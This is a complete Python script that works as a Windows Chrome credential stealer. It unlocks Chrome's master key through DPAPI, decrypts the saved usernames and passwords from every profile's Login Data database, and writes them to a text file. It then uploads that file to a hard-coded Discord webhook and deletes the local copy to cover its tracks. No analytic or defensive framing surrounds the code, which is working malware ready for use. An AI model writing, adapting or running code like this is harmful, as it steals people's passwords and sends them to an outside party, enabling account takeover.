import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import subprocess
import sys
import requests

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import win32crypt
except ImportError:
    install_package('pywin32')

try:
    from Crypto.Cipher import AES
except ImportError:
    install_package('pycryptodome')

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def list_profiles():
    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                  "Google", "Chrome", "User Data")
    profiles = [name for name in os.listdir(user_data_path) if os.path.isdir(os.path.join(user_data_path, name))]
    return profiles

def process_profile(profile, key, data):
    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                  "Google", "Chrome", "User Data")
    db_path_original = os.path.join(user_data_path, profile, "Login Data")
    db_path_temp = f"temp_{profile}.db"

    # Check if Login Data file exists
    if not os.path.exists(db_path_original):
        print(f"Profile '{profile}' does not have a 'Login Data' file.")
        return

    # Copy the database file to a temporary location
    shutil.copyfile(db_path_original, db_path_temp)

    try:
        # Connect to the copied database
        db = sqlite3.connect(db_path_temp)
        cursor = db.cursor()

        # Execute query
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        # Process results
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                data.append(f"Profile: {profile}")
                data.append(f"Origin URL: {origin_url}")
                data.append(f"Action URL: {action_url}")
                data.append(f"Username: {username}")
                data.append(f"Password: {password}")
                if date_created != 86400000000 and date_created:
                    data.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
                if date_last_used != 86400000000 and date_last_used:
                    data.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                data.append("="*50)
        
        cursor.close()
        db.close()

    except sqlite3.Error as e:
        print(f"SQLite error: {e}")

    finally:
        try:
            # Remove the temporary database file
            os.remove(db_path_temp)
        except Exception as e:
            print(f"Failed to delete temp database {db_path_temp}: {e}")

    return

def main():
    profiles = list_profiles()
    if not profiles:
        print("No profiles found.")
        return
    
    key = get_encryption_key()
    data = []
    
    for profile in profiles:
        process_profile(profile, key, data)
    
    # Write data to a text file
    output_file = "ChromePasswords.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(data))
    
    print(f"Passwords saved to {output_file}")
    
    # Discord Webhook URL
    webhook_url = 'https://discord.com/api/webhooks/1297846125554045048/cbudpKyVFfLuyc_9Fp_hmi5zlKmYc5FvqHDMPEucqBsBiaKafEIs3eoIXrNdQnemlRjF'

    # Prepare file payload
    with open(output_file, 'rb') as f:
        files = {'file': f}
        headers = {'Content-Disposition': 'form-data'}
        payload = {'content': 'Here are the Chrome passwords:', 'username': 'Password Bot'}

        # Send file to Discord
        response = requests.post(webhook_url, files=files, data=payload, headers=headers)

    # Check if request was successful
    if response.status_code == 200:
        print('File sent successfully to Discord!')
    else:
        print(f'Failed to send file to Discord. Status code: {response.status_code}')

    # Delete the file after sending it
    try:
        os.remove(output_file)
        print(f'{output_file} deleted successfully.')
    except Exception as e:
        print(f'Failed to delete {output_file}: {e}')

if __name__ == "__main__":
    main()
